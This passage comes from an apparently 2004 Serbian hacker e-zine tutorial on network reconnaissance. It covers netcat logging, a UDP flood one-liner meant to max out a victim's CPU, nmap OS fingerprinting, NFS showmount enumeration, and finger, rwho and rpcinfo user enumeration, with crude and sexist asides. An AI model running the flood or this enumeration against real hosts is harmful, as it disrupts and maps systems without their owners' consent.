  ~ ERROR :Closing Link: [212.62.46.100] (Ping timeout)

   ==---------[/code]---------==

   
Sada mozemo procitati fajl /tmp/govno u koji je upisan log.Vec sam rekao
cemu sluzi -o opcija kod NC.

   ==---------[code]----------== 
bash-2.05b# cat /tmp/govno.1107766874.2317
< 00000000 3a 68 75 62 2e 6b 72 73 74 61 72 69 63 61 2e 63 # :hub.krstarica.c
< 00000010 6f 6d 20 4e 4f 54 49 43 45 20 41 55 54 48 20 3a # om NOTICE AUTH :
< 00000020 2a 2a 2a 20 4c 6f 6f 6b 69 6e 67 20 75 70 20 79 # *** Looking up y
< 00000030 6f 75 72 20 68 6f 73 74 6e 61 6d 65 2e 2e 2e 0d # our hostname....
< 00000040 0a 3a 68 75 62 2e 6b 72 73 74 61 72 69 63 61 2e # .:hub.krstarica.
< 00000050 63 6f 6d 20 4e 4f 54 49 43 45 20 41 55 54 48 20 # com NOTICE AUTH
< 00000060 3a 2a 2a 2a 20 46 6f 75 6e 64 20 79 6f 75 72 20 # :*** Found your
< 00000070 68 6f 73 74 6e 61 6d 65 20 28 63 61 63 68 65 64 # hostname (cached
< 00000080 29 0d 0a 3a 68 75 62 2e 6b 72 73 74 61 72 69 63 # )..:hub.krstaric
< 00000090 61 2e 63 6f 6d 20 4e 4f 54 49 43 45 20 41 55 54 # a.com NOTICE AUT
< 000000a0 48 20 3a 2a 2a 2a 20 43 68 65 63 6b 69 6e 67 20 # H :*** Checking
< 000000b0 69 64 65 6e 74 2e 2e 2e 0d 0a                   # ident.....
< 000000ba 3a 68 75 62 2e 6b 72 73 74 61 72 69 63 61 2e 63 # :hub.krstarica.c
< 000000ca 6f 6d 20 4e 4f 54 49 43 45 20 41 55 54 48 20 3a # om NOTICE AUTH :
< 000000da 2a 2a 2a 20 4e 6f 20 69 64 65 6e 74 20 72 65 73 # *** No ident res
< 000000ea 70 6f 6e 73 65 3b 20 75 73 65 72 6e 61 6d 65 20 # ponse; username
< 000000fa 70 72 65 66 69 78 65 64 20 77 69 74 68 20 7e 0d # prefixed with ~.
< 0000010a 0a                                              # .
< 0000010b 45 52 52 4f 52 20 3a 43 6c 6f 73 69 6e 67 20 4c # ERROR :Closing L
< 0000011b 69 6e 6b 3a 20 5b 32 31 32 2e 36 32 2e 34 36 2e # ink: [212.62.46.
< 0000012b 31 30 30 5d 20 28 50 69 6e 67 20 74 69 6d 65 6f # 100] (Ping timeo
< 0000013b 75 74 29 0d 0a                                  # ut)..
   ==---------[/code]---------==
   
Sta mislite da nekom opteretite CPU 100% i to samo saznanjem da mu je
otvoren neki UDP port.To se lako moze izvesti.

   ==---------[code]----------== 
   bash-2.05b# yes "<20>smradusmradu" | nc -u localhost 512      
   ==---------[/code]---------==

Ovim smo naflodovali UDP port 512 koji je open na zrtvi,stringom
"smradusmradu".		      
Sa TOP komandom mozemo videti i zauzece koje ce ubrzo prerasti u
100%.

   ==---------[code]----------== 
   PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
   10011 root      15   0   472  472  412 R 88.3  0.1   0:36.55 yes
   10012 root      12   0   560  560  484 S 17.5  0.1   0:12.08 nc
   ==---------[/code]---------==
   .....ahhhhhhhhhhh toliko o NC mada nisam planirao se toliko raspisem :P
   
 
   
    ==-[ 0x02e % OS Fingerprinting 
    
  Jos jedan veoma vazan korak ka osvajanju sistema.Prepoznavnje OS
Zasto nam uopste koristi tip OS?
Tip OS nam treba iz vise razloga npr moze nam reci i ranjivost sistema, jer svima
je poznato da su win veoma vuln, dok kod unixa vaze neke druge metode i servisi
koji su specificni samo za njega, a koji su opet mnogo bugoviti (Samba).
OS mozemo saznati rucno vec opisanom metodom otimanja zaglavlja, i to tako sto 
cemo prouciti servise koji su pokrenuti tj npr ako je pokrenuta neka RPC usluga
znamo da je UNIX u pitanju ili npr SENDMAIL....ako je port 119 netbios 
otvoren to je windoza itd...mada to uopste nemoze biti pouzdana informacija iz
vise razloga. Medjutim sve ovo mozemo otkriti i raznim alatkma i sa nmap poseduje
opciju -O kocom cemo saznati tip OS.

   ==---------[code]----------==
   root@badnick:~# nmap -O localhost

   Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-08-09 00:59 UTC
   Interesting ports on localhost (127.0.0.1):
   (The 1656 ports scanned but not shown below are in state: closed)
   PORT     STATE SERVICE
   22/tcp   open  ssh
   80/tcp   open  http
   6000/tcp open  X11
   Device type: general purpose
   Running: Linux 2.4.X|2.5.X
   OS details: Linux Kernel 2.4.0 - 2.5.20
   Uptime 0.003 days (since Mon Aug  9 00:55:35 2004)
  
   Nmap run completed -- 1 IP address (1 host up) scanned in 5.199 seconds
   ==---------[/code]---------==
   
 NMAP ima bazu sa otiscima svih OS,medjutim opet pouzdanost nije 100%.
 
  Jos jedna popularna metoda je metoda Uzimanja Aktivnog Steka.
Pomocu ove tehnike sa velikom sigrunoscu mozete utvrditi o kom se OS radi.
Posto postoje mnoge bilo sitne ili malo krupnije razlike u realizaciji
IP steka proizvodjacamkoji razlicito tumace RFC pravila onda dolazi do pojave 
rezlika u OS, koje mozemo iskoristiti za utvrdjivanje OS. Za uzimanje steka mora
biti otvoren makar jedan port.
Nacini utvrdjivanja OS:

   [=- Sonda FIN -FIN paket se posalje otvorenom portu,ako host odgovori
                  signalom FIN/ACK onda je to WinNT jer npr UNIX nece
		  odgovoriti na FIN zahtev.
		  
   [=- TOS       -Type OF Service,Kada se dobije poruka "ICMP port Unreachable"
                 ispituje se TOS. U nekim stekovima vrednost je 0 ,u nekim ne.
		
   [=- Fake Sonda-sonda sa laznim identifikatorom.U TCP zaglavlju paketa SYN
                  zadaje se nedefinisani TCP indetifikator. Linux ce npr odgo-
		  voriti paketom sa istim tim identifikatorom.
		  
   [=- Velicina p-Meri se pocetna velicina prozora u paketima.
   
   [=- Vredn. ACK-IP stekovi za polje ACK koriste razliciti redni broj.
                  tako da ce vam neki stekovi vratiti vrednost koju ste
		  poslali dok ce drugi vratiti uvecanu za 1.
		    
   [=- ICMP poruke-Pomocu ICMP poruka moze zakljuciti koji je OS,tj njihovom
                   analizom. 

  Kao sto sam vec pomenuo najznacajniji alat pomocu koga mozete otkriti OS je n
map. On ce i ako nema otvorenih portova pokusati da pogodi OS.	
nMap sve svoje podatke i popise OS cuva u datoteci koja se obnavlja svakom novom
verzijom nmapa,ta datoteka se zove /*nmap-os-fingerprints*/.	
  Prethodno sam objasnio Aktivno uzimanje steka i aktivno prepoznavanje OS,sada
cu reci par reci o pasivnom.
Pasivno uzimanje steka se odvija bez slanja paketa i interakcije sa zrtvom,
vec OS cemo otkriti prateci mrezni asobracaj zrtve.
Postoje par vema vaznih atributa koje moramo posmatrati tokom pracenja mreznih 
aktivnosti a to su:   

   [=- TTL --Time To Live
   [=- Velicina Prozora,tj vrednost Window size
   [=- DF -Dont Fragment tj ne usitnjavaj bit
   
  Tako da pazljivim pracenjem ovih atributa i njihovim poredjenjem iz baze
podataka shvaticemo koji je OS u pitanju,
Skinite program //**SIPHON**// koji ce vam mnogo pomoci oko pasivnog
uzimanja steka.   


   ==-[ 0x03f  %  



Generalno mrezni i deljeni resursi predstavljaju veoma veliki rizik
za vas sistem. Oni su veoma cesto nacin na koji sebe mozete izloziti 
opasnosti. Opet sve ove tehnike idu sa vasim poznavanjem skeniranja
makar onog osnovnog kao sto je skeniranje portova,jer ako npr
vidite da je na sistemu aktiviran port /*2049*/ to znaci da je na 
ciljanom sistemu pokrenut NFS tj Network File System.
NFS je tokom godina mnogo puta exploatisan medjutim on se jos uvek
koristi i ima siroku primenu.
Ukoliko vidimo da ciljani sistem ima NFS mozemo iskoristiti par UNIX
utila kako bismo izvrsili popisivanje te masine:


   ==---------[code]----------==
   root@l0v3x0r:~# nmap -p2049 127.0.0.1
   
   Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-08-16 16:55 UTC
   Interesting ports on localhost (127.0.0.1):
   PORT     STATE  SERVICE
   2049/tcp closed nfs
   
   Nmap run completed -- 1 IP address (1 host up) scanned in 0.311 seconds
   ==---------[/code]---------==
   
Sta smo ovde uradili???Pa koristili smo nmap sa -p opcijom kako 
bi videli da li je NFS port 2049 otovren,kao sto mozemo videti
kod mene je u stanju closed ---znaci zatvoren jer naravno nit mi 
treba niti cu da izlazem svoj sistem opasnosti na taj nacin.
Ali zamislimo da je nekom NFS upaljen jer mu treba zbog posla 
,firmina mreza itd....
E tu mozemo izvrsiti popisivanje na sledeci nacin:
   
   ==---------[code]----------==
   root@l0v3x0r:~# showmount
   mount clntudp_create: RPC: Port mapper failure - RPC: Unable to receive
   ==---------[/code]---------==
   
    Ova poruka ce se desiti ukoliko nemate *RPC* servise pokrenute...kao ja npr :)
   Znaci ode u kurac i mlada i pecenje..tj nis,,,,aliiiista ako dobijete 
   neki ispis tj *1337* *output* :) to ce izgledati ovako:
   
   ==---------[code]----------==
   root@l0v3x0r:~# showmount -e 127.0.0.1    
   export list for 127.0.0.1:
   /var                    (everyone)
   /usr                    user
   ==---------[/code]---------==
   
   
   
 Naravno da ce se ispis razlikovati od masine do masine.
   
   [=- -e opcija ce vam omoguciti prikaz liste datoteka.
   Showmount poseduje par opcija zato najbolje malo procitajte man
   stranicu.
   Ja cu navest neke znacajnije:
   
   [=- -d   --lista dirove montovane od strane nekog klijenta
   [=- -a   --lista hostname i montovane dirove
   [=- -e   --export lista
   
      Pored NFS koji je najrasprostranjeniji postoji jos par servera 
tipa NFS a to je npr noviji serv nazvan SAMBA. Njega cete korsititi
ukoliko imate npr neku heterogenu mrezu. On ima super resenja sto se
tice rada sa dirovima i stampanjem i super koegzistira sa Winom.
o Sambi vise u tutorialu Earthquake-a.








  Saznati sto vise o userima na ciljanom sistemu predstavlja veoma vazan
stepenik ka osvajanju sistema,mozda neki user koristi istu lozinku 
kao i username, mozda neki user nije stavio sifru???Sve su to moguci 
scenariji koji se i vama mogu desiti. Zato je popisivanje usera veoma
vazno jer mozete saznati aktivne naloge na masini.Cilj je uvideti
sve usere koji se nalaze na sistemu. Naravno da bi najlakse bilo kada
bi se docepali */etc/passwd* fajla medjutim da bi to izveli vec bi morali
biti u sistemu pa onda cemu poenta.
 Od najjacih alatki za popis usera i grupa izdvojio bih neke standardne
UNIX *utile* koji se mogu naci na svakom sistemu, a to su *FINGER* i *RWHO*.

     -=FINGER=-

  Finger je standardni util koji dolazi sa UNIX-om.Nekada FINGER se veoma 
cesto koristio jer je bi pogodan za davanje informacija o userima.
Finger kontrolis finger daemon koga mozete iskljuciti iz */etc/inetd* fajla,
I to tako sto cete samo *comentovati* red u kom se nalazi finger,a zatim
ubiti inetd 
   
 #killall -HUP inetd
   
Finger prikazuje odredjena polja datoteke /etc/passwd. Znaci ako je admin
pri pravljenju logina uneo neke intimne podatke npr broj telefona onaj ko 
vas fingeruje moze procitati te podatke. Takodje finger cita iz jos dva fajla
*.project*, *plans*. Njih mozete samo napraviti u */home/* diru:

   ==---------[code]----------==
   root@l0v3x0r:~# touch .plan
   root@l0v3x0r:~# cat >> .plan
   jedi gomna
   misevu jedan
   ==---------[/code]---------==
   
 I sada ce svako ko vas fingeruje videti pri dnu ispisa vas .plan ili .project.
   
Da jos napomenem da FINGER slusa na 79 portu,tako da sa *ipchainsima*
ili nekim drugim *firewallom* mozete zabraniti saobracaj na tom
portu.
   
   Da pokazem par primera fingerovanja:
   
   ==---------[code]----------==
   root@l0v3x0r:~# finger
   |Login     Name       Tty      Idle  Login Time   Office     Office Phone
   |root      srdjan     tty1       14  Aug 17 14:50
   ==---------[/code]---------==
   
Unosenjem samo komande FINGER dobijamo spisak logovanih usera, sa jos par 
informacija tipa terminala na koji je logovan (TTY), kada se logovao,
broj telefona itd....   

   ==---------[code]----------==   
   root@l0v3x0r:~# finger -l root
   |Login: root                             Name: srdjan
   |Directory: /root                        Shell: /bin/bash
   |On since Tue Aug 17 14:50 (UTC) on tty1   16 minutes 56 seconds idle
   |Mail last read Sun Aug  8 02:56 2004 (UTC)
   |Plan:
   |jedi gomna
   |misevu jedan
   ==---------[/code]---------==
   
 Ovde mozemo videti da sam koristio opciju -l koja ce vam dati potpuni OUTPUT,
veoma detaljni prikaz navedenog usera. Mozemo videti shell koji mu je default
ime,kada je logovan ...i na kraju PLAN: tj sadrzaj fajla plan koji sam vec
objasnio sta je.
   
   -p  --opcija nece prikazati sadrzaj datoteke .plan

   ==---------[code]----------==
   root@l0v3x0r:~# finger @localhost
   [localhost]
   finger: connect: Connection refused
   ==---------[/code]---------==
   
   
   
Ovo je primer konektovana na fingerd u potrazi za podatcima tog domena,
medjutim posto je kod mene *disable* fingerd, nece biti rezultata.
   
Ako zelite privatnost predlazem pravljenje *.nofinger* fajla u home diru
koji ce vam omoguciti zeljenu privatnost. Naravno morate videti da li fingerd
cita taj fajl.
Znaci kad finger naidje na taj fajl on ce odbiti postojanje tog usera.   

    -= R WHO =-
   
  Je jedna od RPC usluga koje ne bih preporucio za koriscenje zbog vulnova.
Znaci nju ne kontrolise inetd vec /*rpc.rusersd*/ koji se obicno nalazi u
startup diru.
Util RWHO izlistava usere na remote masini.
   
   ==---------[code]----------==
   root@l0v3x0r:~# rwho 212.113.202.43
   jack    localhost:ttyp1     Avg 17 05:21
   ==---------[/code]---------==
   
   Komanda *RUSERS* ce vam dati siri ispis tj detaljniji,koristite je sa -l
   opcijom.

    -= RPCINFO =-
   
 Ukoliko zelimo da vidimo i saznamo sto vise o RCP sulugama mozemo koristiti
alat slican fingeru,a to je rpcinfo.

   ==---------[code]----------==
   oot@l0v3x0r:/etc/rc.d# rpcinfo -p 127.0.0.1
   program vers proto   port
   100000    2   tcp    111  portmapper
   100000    2   udp    111  portmapper
   ==---------[/code]---------==   
   
  Time cemo videti RPC suluge i plus na kojim portovima rade.
  
   ==---------[code]----------==
  | root@l0v3x0r:/etc/rc.d# nmap -sS -sR localhost

  |Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-08-17 15:49 UTC
  |Interesting ports on localhost (127.0.0.1):
  |(The 1655 ports scanned but not shown below are in state: closed)
  |PORT     STATE SERVICE              VERSION
  |22/tcp   open  ssh
  |80/tcp   open  http
  |111/tcp  open  rpcbind (rpcbind V2) 2 (rpc #100000)
  |6000/tcp open  X11
   ==---------[/code]---------== 
  
  Ehh...ovako cemo videti verziju programa RPCbind kao i ostalih RPC usluga.
   
   
--==<[ 0x03 %  EOF
      \___________/ 
      
  
    
      
   ==-[ 0x03a % OUTRO
   
  ....i sta reci na kraju kada se rastajemo.Od pocetne ideje kratkog pojasnjenja
skeniranja i popisivanja dodjosmo na jedan veliiiiikii phile koji sadrzi mnogo
vise.Ukljucio sam u njega sve sto mislim da je potrebno jednom pocetniku da se
snadje u ovom svetu. Nisam ulazio previse u dubinu stvari jel bi tada broj list-
ova iznosio x10. Mislim da ce ovo biti sasvim dovoljno za neki uvod u ovu oblast.
  Za sve vazi isto citajtemradite, ucite, Internet je pun mogucnosti i opcija 
zasto ih ne iskoristiti. Na dohvat tuke vam je dosta knjiga dosta tutoriala...
samo treba volje i zelje, jel nemozete preko dana nauciti sve. Ulozite malo
truda kasnije ce vam se isplatiti.
  Prosirite ovaj mali delic znanja koji sam preneo vama, ucite sto dublje shvat-
ite sustinu stvari, nemojte biti glupi klinac sa exploitom u ruci.
  Od mene za ovaj prvi broj e-zine-a dosta. Kao founder nadam se da ce vam se 
zine svideti, a takodje obecavam da ce naredni biti jos bolji.
Prenosenje znanja je stvar koju cenim, mada su takvi retki na Brdovitom balkanu.
I nedajte da vas iko zaustavi na putu ka ostvarenju cilja......ali opet pona-
vljam najvaznije jurite picke :) i napijajte se mada to i nije zdravo ;P
mislim na napijanje al ajd sad. Zivot je kratak i pruza mnogo zadovoljstva zato
opusteno ! ....chherz

     
   ==-[ 0x03b % Credits
   
  __________________________________________________________________________
  |                                                                        |
  |[=- Tnx 2:Me,myself and Irene (ok nije bas Irena al nema veze)          |
  |                                                                        |
   [=- greetz 2: #ugs,#secure,#sabac,#linux .....shatter,cookie,kiler,cyberB,
                limp,m4rk0,demo,sindel,pinky_jso,force,ckayt,sabb,esc,dang....
		girl :P,nadax2,ana,sanya,exoduks,reeot,branko,MIX,earth,only 
		SEMSA and JUZNI VETAR and VIDA PAVLOVIC
		...  AND ALL GOD Ch1X 
		
   [=- spec greetz 2: MaYur ghettoo,mc phorums,bla bla bla		
		....and once again
		
		       H F B (hacking for bitchez) rule the W O R L D
		
  W E   D E M A N D a L O T  O F  H O T  B I T C H E Z and L O T of G A N Dz A
  ------------------------\_____________________________/---------------------
                                    P E A C E!
				     
EOF
				     